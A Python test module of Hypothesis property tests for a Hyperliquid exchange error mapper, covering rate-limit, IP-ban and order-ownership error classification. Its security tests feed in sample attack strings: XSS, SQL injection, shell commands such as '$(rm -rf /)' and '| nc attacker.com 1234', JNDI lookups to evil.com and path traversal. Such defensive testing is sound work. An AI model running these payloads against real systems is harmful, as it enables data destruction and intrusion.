"""Property-based tests for Hyperliquid Error Mapping Implementation.

This module provides comprehensive property-based testing of the HyperliquidErrorMapper class,
which is critical for secure and reliable error handling in trading operations.

SECURITY CRITICAL: Error mapping must correctly translate exchange errors to prevent:
- Incorrect error classification leading to wrong retry strategies
- Security information leakage through error messages
- Rate limiting bypass through improper error handling
- Financial losses due to misclassified trading errors
- IP ban detection failures that could lead to account restrictions

Key Testing Areas:
- HTTP status code to API error code mapping with comprehensive scenarios
- Hyperliquid-specific error message pattern recognition (string-based errors)
- IP ban detection for 403 + rate limit message combinations
- Order ownership and authentication error handling
- Rate limiting error classification and retry behavior
- Edge cases and adversarial error responses for security boundaries

Following TESTING_SECURITY_RULES.md:
- NO hardcoded error values (Hypothesis generates them)
- NO fallback mechanisms that could hide critical errors
- Comprehensive testing of error boundary conditions
- Validation of security-sensitive error handling behaviors

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for error model handling
- Implements RULE-RUNTIME-SAFETY-V4 for safe error processing
- Adheres to RULE-NO-SILENCING-V4 for proper error propagation
"""

from __future__ import annotations

import json
from datetime import timedelta

import pytest
from hypothesis import given, settings, strategies as st
from hypothesis.strategies import SearchStrategy, composite

from cyberdelta.apis.common import APIError, APIErrorCode
from cyberdelta.apis.hyperliquid.hl_errors_mapper import HyperliquidErrorMapper


@pytest.fixture
def hyperliquid_error_mapper() -> HyperliquidErrorMapper:
    """Create a HyperliquidErrorMapper instance for tests.

    Returns:
        HyperliquidErrorMapper: An error mapper instance for testing.
    """
    return HyperliquidErrorMapper()


# =============================================================================
# HELPER FUNCTIONS FOR HYPOTHESIS STRATEGY BUILDING
# =============================================================================


def _create_user_oid_error(oid: int) -> str:
    """Create user OID error message.

    Args:
        oid: Order ID number.

    Returns:
        Formatted error message with OID.
    """
    return f"L1 error: User or API Wallet 0x123... does not exist for oid {oid}"


def _create_user_not_exist_error(addr: str) -> str:
    """Create user does not exist error message.

    Args:
        addr: Address string.

    Returns:
        Formatted error message with address.
    """
    return f"L1 error: User {addr} does not exist"


def _create_invalid_symbol_error(symbol: str) -> str:
    """Create invalid symbol error message.

    Args:
        symbol: Symbol string.

    Returns:
        Formatted invalid symbol error message.
    """
    return f"Invalid symbol: {symbol}"


def _create_rate_limit_minute_error(minutes: int) -> str:
    """Create rate limit error message for single minute.

    Args:
        minutes: Number of minutes.

    Returns:
        Formatted rate limit error message for minute.
    """
    return f"Your IP has been rate limited for {minutes} minute. Please try again later."


def _create_rate_limit_minutes_error(minutes: int) -> str:
    """Create rate limit error message for multiple minutes.

    Args:
        minutes: Number of minutes.

    Returns:
        Formatted rate limit error message for minutes.
    """
    return f"Your IP has been rate limited for {minutes} minutes. Please try again later."


def _create_wallet_oid_error(wallet: str, oid: int) -> str:
    """Create wallet OID error message.

    Args:
        wallet: Wallet address string.
        oid: Order ID number.

    Returns:
        Formatted wallet OID error message.
    """
    return f"L1 error: User or API Wallet {wallet} does not exist for oid {oid}"


def _create_wallet_address(addr: str) -> str:
    """Create wallet address string.

    Args:
        addr: Address hex string.

    Returns:
        Formatted wallet address.
    """
    return f"0x{addr}..."


def _create_full_wallet_address(addr: str) -> str:
    """Create full wallet address string.

    Args:
        addr: Address hex string.

    Returns:
        Formatted full wallet address.
    """
    return f"0x{addr}"


def _not_unknown_error_filter(x: str) -> bool:
    """Check if string is not a known error pattern.

    Args:
        x: String to check.

    Returns:
        True if string is not a known error pattern.
    """
    return not any(
        pattern in x.lower()
        for pattern in [
            "order not found",
            "insufficient margin",
            "invalid order size",
            "ratelimit",
            "user not found",
            "rate limit",
        ]
    )


def _not_rate_limit_filter(x: str) -> bool:
    """Check if string is not a rate limit pattern.

    Args:
        x: String to check.

    Returns:
        True if string is not a rate limit pattern.
    """
    return not any(
        pattern in x.lower()
        for pattern in ["rate limit", "ratelimit", "too many requests", "wait", "retry"]
    )


# =============================================================================
# HYPOTHESIS STRATEGIES FOR HYPERLIQUID ERROR MAPPER TESTING
# =============================================================================


def hl_http_status_strategy() -> SearchStrategy[int]:
    """Generate valid HTTP status codes for Hyperliquid error mapping testing.

    Returns:
        A Hypothesis strategy for HTTP status codes.
    """
    return st.one_of([
        # Common error status codes Hyperliquid uses
        st.sampled_from([200, 400, 401, 403, 404, 429, 500, 503, 504]),
        # Any valid HTTP error status
        st.integers(min_value=400, max_value=499),
        st.integers(min_value=500, max_value=599),
    ])


def hl_request_path_strategy() -> SearchStrategy[str]:
    """Generate valid Hyperliquid API request paths.

    Returns:
        A Hypothesis strategy for Hyperliquid request paths.
    """
    return st.sampled_from([
        "/info",
        "/exchange",
        "/exchange/account",
        "/exchange/order",
        "/exchange/cancel",
        "/exchange/modify",
        "/exchange/batchModify",
        "/exchange/updateLeverage",
        "/exchange/updateIsolatedMargin",
        "/exchange/transfer",
        "/exchange/withdraw",
        "/exchange/createSubAccount",
        "/exchange/subAccountTransfer",
    ])


def hl_string_error_strategy() -> SearchStrategy[str]:
    """Generate Hyperliquid-style string error messages.

    Returns:
        A Hypothesis strategy for Hyperliquid string errors.
    """
    return st.one_of([
        # Known Hyperliquid error patterns
        st.sampled_from([
            "Order not found",
            "exchange: Insufficient margin",
            "Invalid order size",
            "Ratelimit exceeded",
            "User not found",
            "Insufficient margin",
            "Invalid signature",
            "Invalid timestamp",
            "Order already filled",
            "Market closed",
            "Position limit exceeded",
        ]),
        # Error patterns with dynamic content
        st.builds(
            _create_user_oid_error,
            st.integers(min_value=1000000, max_value=999999999999),
        ),
        st.builds(
            _create_user_not_exist_error,
            st.text(alphabet="0123456789abcdef", min_size=40, max_size=42),
        ),
        st.builds(
            _create_invalid_symbol_error,
            st.text(alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZ-_", min_size=3, max_size=10),
        ),
        # Rate limit patterns
        st.builds(
            _create_rate_limit_minute_error,
            st.integers(min_value=1, max_value=60),
        ),
        st.builds(
            _create_rate_limit_minutes_error,
            st.integers(min_value=2, max_value=60),
        ),
        st.sampled_from([
            "Too many requests. Please wait and retry.",
            "Rate limit exceeded, please try again later",
            "Request rate limit exceeded",
        ]),
        # Generic error messages
        st.text(min_size=5, max_size=200),
    ])


def hl_ip_ban_message_strategy() -> SearchStrategy[str]:
    """Generate IP ban related error messages.

    Returns:
        A Hypothesis strategy for IP ban messages.
    """
    return st.one_of([
        st.builds(
            _create_rate_limit_minute_error,
            st.integers(min_value=1, max_value=1),
        ),
        st.builds(
            _create_rate_limit_minutes_error,
            st.integers(min_value=2, max_value=60),
        ),
        st.sampled_from([
            "Ratelimit exceeded",
            "Too many requests. Please wait and retry.",
            "Rate limit exceeded",
            "Request rate exceeded",
            "Too many requests from your IP",
        ]),
    ])


def malicious_hl_error_strategy() -> SearchStrategy[str]:
    """Generate malicious error inputs for security testing.

    Returns:
        A Hypothesis strategy for malicious error inputs.
    """
    return st.one_of([
        # XSS attempts in error messages
        st.sampled_from([
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]),
        # SQL injection attempts
        st.sampled_from([
            "'; DROP TABLE orders;--",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users WHERE 1=1; --",
        ]),
        # Command injection
        st.sampled_from([
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "; ls -la",
            "| nc attacker.com 1234",
        ]),
        # Buffer overflow attempts
        st.text(alphabet="A", min_size=1000, max_size=1500),
        # Format string attacks
        st.sampled_from(["%s%s%s%s%s", "%x%x%x%x", "%n%n%n%n"]),
        # Unicode attacks
        st.sampled_from([
            "\\udce2\\udc28\\udc00",
            "\\x00\\x01\\x02",
            "\\u202e\\u202d",  # Right-to-left override
        ]),
        # Log injection
        st.sampled_from([
            "${jndi:ldap://evil.com/a}",
            "${java:runtime}",
            "%{jndi:ldap://evil.com/a}",
        ]),
        # Empty and whitespace
        st.sampled_from(["", " ", "\\t", "\\n", "\\r\\n"]),
    ])


def hl_order_ownership_error_strategy() -> SearchStrategy[str]:
    """Generate order ownership error patterns.

    Returns:
        A Hypothesis strategy for order ownership errors.
    """
    return st.builds(
        _create_wallet_oid_error,
        st.builds(
            _create_wallet_address,
            st.text(alphabet="0123456789abcdef", min_size=6, max_size=6),
        ),
        st.integers(min_value=1000000, max_value=999999999999),
    )


@composite
def hl_error_scenario_strategy(draw: st.DrawFn) -> tuple[int, str, str]:
    """Generate complete Hyperliquid error scenarios.

    Args:
        draw: Hypothesis draw function

    Returns:
        Tuple of (status_code, error_body, request_path)
    """
    status_code = draw(hl_http_status_strategy())
    error_body = draw(hl_string_error_strategy())
    request_path = draw(hl_request_path_strategy())

    return status_code, error_body, request_path


@composite
def hl_ip_ban_scenario_strategy(draw: st.DrawFn) -> tuple[int, str, str]:
    """Generate IP ban scenarios for testing.

    Args:
        draw: Hypothesis draw function

    Returns:
        Tuple of (status_code, error_body, request_path)
    """
    # IP bans are typically 403 with rate limit messages
    status_code = draw(st.sampled_from([403, 429]))
    error_body = draw(hl_ip_ban_message_strategy())
    request_path = draw(hl_request_path_strategy())

    return status_code, error_body, request_path


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID ERROR MAPPING
# =============================================================================


class TestHyperliquidErrorMapperProperties:
    """Property-based tests for HyperliquidErrorMapper core functionality."""

    @given(
        error_scenario=hl_error_scenario_strategy(),
    )
    @settings(max_examples=300, deadline=timedelta(seconds=1))
    def test_error_mapping_preserves_http_status(
        self, error_scenario: tuple[int, str, str]
    ) -> None:
        """Property: HTTP status code should always be preserved in mapped errors."""
        status_code, error_body, request_path = error_scenario
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=error_body,
            error_data=None,
            request_path=request_path,
        )

        # Property: HTTP status must be preserved exactly
        assert api_error.http_status == status_code

        # Property: API error code should be valid enum value
        assert api_error.code in [str(code.value) for code in APIErrorCode]

        # Property: Message should not be empty for valid inputs
        assert isinstance(api_error.message, str)

        # Property: Exchange message should preserve original error body
        assert api_error.exchange_message == error_body

    @given(
        known_error=st.sampled_from([
            "Order not found",
            "exchange: Insufficient margin",
            "Invalid order size",
            "Ratelimit exceeded",
            "User not found",
        ]),
        status_code=hl_http_status_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_known_error_pattern_mapping(
        self, known_error: str, status_code: int, request_path: str
    ) -> None:
        """Property: Known error patterns should map to specific API error codes."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=known_error,
            error_data=None,
            request_path=request_path,
        )

        # Property: Known patterns should map to specific codes
        if "Order not found" in known_error:
            assert api_error.code == APIErrorCode.ORDER_NOT_FOUND.value
        elif "Insufficient margin" in known_error:
            assert api_error.code == APIErrorCode.INSUFFICIENT_FUNDS.value
        elif "Invalid order size" in known_error:
            assert api_error.code == APIErrorCode.INVALID_ORDER_SIZE.value
        elif "Ratelimit exceeded" in known_error:
            assert api_error.code == str(APIErrorCode.RATE_LIMITED.value)
        elif "User not found" in known_error:
            assert api_error.code == str(APIErrorCode.AUTHENTICATION_FAILED.value)

        # Property: Error message should contain original text
        assert known_error in api_error.message

    @given(
        status_code=st.sampled_from([400, 401, 403, 429, 500, 503]),
        error_body=hl_string_error_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_status_code_based_mapping_consistency(
        self, status_code: int, error_body: str, request_path: str
    ) -> None:
        """Property: Status code mapping should be consistent."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=error_body,
            error_data=None,
            request_path=request_path,
        )

        # Property: Status codes should map consistently
        if status_code == 401:
            assert api_error.code == str(APIErrorCode.AUTHENTICATION_FAILED.value)
        elif status_code == 429:
            assert api_error.code == str(APIErrorCode.RATE_LIMITED.value)
        elif status_code == 500:
            assert api_error.code == str(APIErrorCode.SERVER_ERROR.value)
        elif status_code == 503:
            assert api_error.code == str(APIErrorCode.SERVICE_UNAVAILABLE.value)

    @given(
        unknown_error=st.text(min_size=1, max_size=200).filter(_not_unknown_error_filter),
        status_code=hl_http_status_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_unknown_error_handling(
        self, unknown_error: str, status_code: int, request_path: str
    ) -> None:
        """Property: Unknown errors should be handled with appropriate fallbacks."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=unknown_error,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should have valid API error code
        assert api_error.code in [str(code.value) for code in APIErrorCode]

        # Property: Should preserve original error text
        assert unknown_error in api_error.message

        # Property: Should classify based on status code when pattern unknown
        if status_code >= 500:
            assert api_error.code in [
                APIErrorCode.SERVER_ERROR.value,
                APIErrorCode.SERVICE_UNAVAILABLE.value,
                APIErrorCode.EXCHANGE_SPECIFIC.value,
            ]
        elif status_code >= 400:
            assert api_error.code in [
                APIErrorCode.INVALID_REQUEST.value,
                APIErrorCode.AUTHENTICATION_FAILED.value,
                APIErrorCode.EXCHANGE_SPECIFIC.value,
            ]

    @given(
        empty_body=st.sampled_from(["", "   ", "\\n", "\\t"]),
        status_code=st.sampled_from([401, 403, 429, 500, 503]),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_empty_error_body_handling(
        self, empty_body: str, status_code: int, request_path: str
    ) -> None:
        """Property: Empty error bodies should be handled gracefully."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=empty_body,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should not crash on empty input
        assert isinstance(api_error.code, str)
        assert api_error.code in [str(code.value) for code in APIErrorCode]

        # Property: HTTP status should be preserved
        assert api_error.http_status == status_code

        # Property: Should have meaningful classification based on status
        if status_code == 401:
            assert api_error.code == str(APIErrorCode.AUTHENTICATION_FAILED.value)
        elif status_code == 429:
            assert api_error.code == str(APIErrorCode.RATE_LIMITED.value)
        elif status_code == 500:
            assert api_error.code == str(APIErrorCode.SERVER_ERROR.value)
        elif status_code == 503:
            assert api_error.code == str(APIErrorCode.SERVICE_UNAVAILABLE.value)


# =============================================================================
# PROPERTY TESTS FOR IP BAN DETECTION
# =============================================================================


class TestHyperliquidIPBanDetectionProperties:
    """Property-based tests for IP ban detection logic."""

    @given(
        ip_ban_scenario=hl_ip_ban_scenario_strategy(),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_ip_ban_detection_patterns(self, ip_ban_scenario: tuple[int, str, str]) -> None:
        """Property: IP ban patterns should be correctly detected."""
        status_code, error_body, request_path = ip_ban_scenario
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=error_body,
            error_data=None,
            request_path=request_path,
        )

        # Property: 403 + rate limit message = IP ban
        if status_code == 403 and any(
            pattern in error_body.lower()
            for pattern in ["rate limit", "ratelimit", "too many requests", "wait and retry"]
        ):
            assert api_error.code == APIErrorCode.IP_BAN_SUSPECTED.value
            # Property: IP ban errors should not have retry_after
            assert api_error.retry_after is None
        elif status_code == 429:
            assert api_error.code == str(APIErrorCode.RATE_LIMITED.value)
        elif status_code == 403:
            assert api_error.code == str(APIErrorCode.AUTHENTICATION_FAILED.value)

        # Property: HTTP status should be preserved
        assert api_error.http_status == status_code
        assert api_error.exchange_message == error_body

    @given(
        non_rate_limit_message=st.text(min_size=5, max_size=100).filter(_not_rate_limit_filter),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_non_ip_ban_403_handling(self, non_rate_limit_message: str, request_path: str) -> None:
        """Property: 403 without rate limit message should not be IP ban."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=403,
            error_body=non_rate_limit_message,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should not be classified as IP ban
        assert api_error.code != APIErrorCode.IP_BAN_SUSPECTED.value
        assert api_error.code == APIErrorCode.AUTHENTICATION_FAILED.value
        assert api_error.http_status == 403

    @given(
        rate_limit_message=hl_ip_ban_message_strategy(),
        non_403_status=st.sampled_from([400, 401, 404, 429, 500, 503]),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_non_403_rate_limit_handling(
        self, rate_limit_message: str, non_403_status: int, request_path: str
    ) -> None:
        """Property: Rate limit messages with non-403 status should not be IP ban."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=non_403_status,
            error_body=rate_limit_message,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should not be classified as IP ban
        assert api_error.code != APIErrorCode.IP_BAN_SUSPECTED.value

        # Property: Should classify based on status code
        if non_403_status == 429:
            assert api_error.code == str(APIErrorCode.RATE_LIMITED.value)
        elif non_403_status == 401:
            assert api_error.code == str(APIErrorCode.AUTHENTICATION_FAILED.value)


# =============================================================================
# PROPERTY TESTS FOR ORDER OWNERSHIP ERRORS
# =============================================================================


class TestHyperliquidOrderOwnershipProperties:
    """Property-based tests for order ownership error patterns."""

    @given(
        ownership_error=hl_order_ownership_error_strategy(),
        status_code=st.sampled_from([200, 400, 404]),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_order_ownership_error_mapping(
        self, ownership_error: str, status_code: int, request_path: str
    ) -> None:
        """Property: Order ownership errors should map to ORDER_NOT_FOUND."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=ownership_error,
            error_data=None,
            request_path=request_path,
        )

        # Property: Order ownership errors should map to ORDER_NOT_FOUND
        assert api_error.code == APIErrorCode.ORDER_NOT_FOUND.value
        assert "does not exist for oid" in api_error.message
        assert api_error.exchange_message == ownership_error
        assert api_error.http_status == status_code

    @given(
        wallet_addr=st.builds(
            _create_full_wallet_address,
            st.text(alphabet="0123456789abcdef", min_size=40, max_size=40),
        ),
        oid=st.integers(min_value=1000000, max_value=999999999999),
        status_code=hl_http_status_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_l1_user_error_patterns(
        self, wallet_addr: str, oid: int, status_code: int, request_path: str
    ) -> None:
        """Property: L1 user errors should be handled consistently."""
        mapper = HyperliquidErrorMapper()

        error_body = f"L1 error: User {wallet_addr} does not exist for oid {oid}"

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=error_body,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should map to appropriate error type
        assert api_error.code == APIErrorCode.ORDER_NOT_FOUND.value
        assert str(oid) in api_error.message
        assert wallet_addr in api_error.message


# =============================================================================
# PROPERTY TESTS FOR SECURITY BOUNDARIES
# =============================================================================


class TestHyperliquidErrorMapperSecurityProperties:
    """Property-based tests for security-critical error mapping behavior."""

    @given(
        malicious_input=malicious_hl_error_strategy(),
        status_code=hl_http_status_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_malicious_input_resistance(
        self, malicious_input: str, status_code: int, request_path: str
    ) -> None:
        """Property: Error mapper should safely handle malicious inputs."""
        mapper = HyperliquidErrorMapper()

        # Should not crash on malicious input
        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=malicious_input,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should return valid error object
        assert isinstance(api_error.code, str)
        assert api_error.code in [str(code.value) for code in APIErrorCode]
        assert api_error.http_status == status_code

        # Property: Should not leak sensitive information
        assert "password" not in api_error.message.lower()
        assert "secret" not in api_error.message.lower()
        assert "key" not in api_error.message.lower()

        # Property: Message length should be reasonable (prevent DoS)
        assert len(api_error.message) <= 10000

    @given(
        large_error=st.text(min_size=1000, max_size=1500),
        status_code=hl_http_status_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_large_input_handling(
        self, large_error: str, status_code: int, request_path: str
    ) -> None:
        """Property: Error mapper should handle large inputs without memory issues."""
        mapper = HyperliquidErrorMapper()

        # Should not crash on large input
        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=large_error,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should produce reasonable output size
        assert len(api_error.message) <= max(len(large_error), 10000)
        assert api_error.http_status == status_code

    @given(
        injection_payload=st.sampled_from([
            "<script>alert('xss')</script>",
            "'; DROP TABLE orders;--",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
            "%s%s%s%s",
            "$(rm -rf /)",
        ]),
        status_code=hl_http_status_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_injection_attack_resistance(
        self, injection_payload: str, status_code: int, request_path: str
    ) -> None:
        """Property: Error mapper should resist various injection attacks."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=injection_payload,
            error_data=None,
            request_path=request_path,
        )

        # Property: Should not execute or interpret malicious content
        assert api_error.http_status == status_code
        assert isinstance(api_error.message, str)

        # Property: Should contain the payload as text, not execute it
        assert injection_payload in api_error.message


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestHyperliquidErrorMapperIntegrationProperties:
    """Integration property tests for complete error mapping workflows."""

    @given(error_scenarios=st.lists(hl_error_scenario_strategy(), min_size=1, max_size=10))
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_batch_error_mapping_consistency(
        self, error_scenarios: list[tuple[int, str, str]]
    ) -> None:
        """Property: Batch error mapping should be consistent across multiple calls."""
        mapper = HyperliquidErrorMapper()

        # Map all errors
        results: list[APIError] = []
        for status_code, error_body, request_path in error_scenarios:
            api_error = mapper.map_exchange_error(
                status_code=status_code,
                error_body=error_body,
                error_data=None,
                request_path=request_path,
            )
            results.append(api_error)

        # Property: All results should be valid
        for api_error in results:
            assert api_error.code in [str(code.value) for code in APIErrorCode]
            assert isinstance(api_error.http_status, int)
            assert isinstance(api_error.message, str)

        # Property: Same input should produce same output (deterministic)
        for (status_code, error_body, request_path), original_result in zip(
            error_scenarios, results, strict=False
        ):
            repeated_result = mapper.map_exchange_error(
                status_code=status_code,
                error_body=error_body,
                error_data=None,
                request_path=request_path,
            )

            assert repeated_result.code == original_result.code
            assert repeated_result.http_status == original_result.http_status
            assert repeated_result.message == original_result.message
            assert repeated_result.retry_after == original_result.retry_after

    @given(
        status_code=hl_http_status_strategy(),
        error_body=hl_string_error_strategy(),
        request_path=hl_request_path_strategy(),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_complete_error_mapping_workflow(
        self, status_code: int, error_body: str, request_path: str
    ) -> None:
        """Property: Complete error mapping should preserve all essential information."""
        mapper = HyperliquidErrorMapper()

        api_error = mapper.map_exchange_error(
            status_code=status_code,
            error_body=error_body,
            error_data=None,
            request_path=request_path,
        )

        # Property: All essential information should be preserved
        assert api_error.http_status == status_code
        assert api_error.exchange_message == error_body

        # Property: API error code should be valid
        assert api_error.code in [str(code.value) for code in APIErrorCode]

        # Property: Message should contain original information
        assert error_body in api_error.message

        # Property: Should be serializable for logging
        error_dict = {
            "code": api_error.code,
            "message": api_error.message,
            "http_status": api_error.http_status,
            "exchange_message": api_error.exchange_message,
            "retry_after": api_error.retry_after,
        }
        # Should not raise exception
        json.dumps(error_dict, default=str)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_hyperliquid_error_mapper_known_patterns() -> None:
    """Test known error patterns for regression verification."""
    mapper = HyperliquidErrorMapper()

    # Test Order not found
    error = mapper.map_exchange_error(
        status_code=200,
        error_body="Order not found",
        error_data=None,
        request_path="/info",
    )
    assert error.code == APIErrorCode.ORDER_NOT_FOUND.value

    # Test Insufficient margin
    error = mapper.map_exchange_error(
        status_code=200,
        error_body="exchange: Insufficient margin",
        error_data=None,
        request_path="/exchange",
    )
    assert error.code == APIErrorCode.INSUFFICIENT_FUNDS.value

    # Test Invalid order size
    error = mapper.map_exchange_error(
        status_code=200,
        error_body="Invalid order size",
        error_data=None,
        request_path="/exchange",
    )
    assert error.code == APIErrorCode.INVALID_ORDER_SIZE.value


def test_hyperliquid_error_mapper_ip_ban_compatibility() -> None:
    """Test IP ban detection for known patterns."""
    mapper = HyperliquidErrorMapper()

    # Test IP ban detection
    error = mapper.map_exchange_error(
        status_code=403,
        error_body="Your IP has been rate limited for 1 minute. Please try again later.",
        error_data=None,
        request_path="/exchange",
    )
    assert error.code == APIErrorCode.IP_BAN_SUSPECTED.value
    assert error.retry_after is None

    # Test normal 403
    error = mapper.map_exchange_error(
        status_code=403,
        error_body="Forbidden action.",
        error_data=None,
        request_path="/exchange",
    )
    assert error.code == APIErrorCode.AUTHENTICATION_FAILED.value

    # Test normal rate limit
    error = mapper.map_exchange_error(
        status_code=429,
        error_body="Rate limit exceeded",
        error_data=None,
        request_path="/info",
    )
    assert error.code == APIErrorCode.RATE_LIMITED.value


def test_hyperliquid_error_mapper_order_ownership_compatibility() -> None:
    """Test order ownership error patterns."""
    mapper = HyperliquidErrorMapper()

    error = mapper.map_exchange_error(
        status_code=400,
        error_body="L1 error: User or API Wallet 0x123... does not exist for oid 34020485897",
        error_data=None,
        request_path="/exchange",
    )
    assert error.code == APIErrorCode.ORDER_NOT_FOUND.value
    assert "does not exist for oid" in error.message
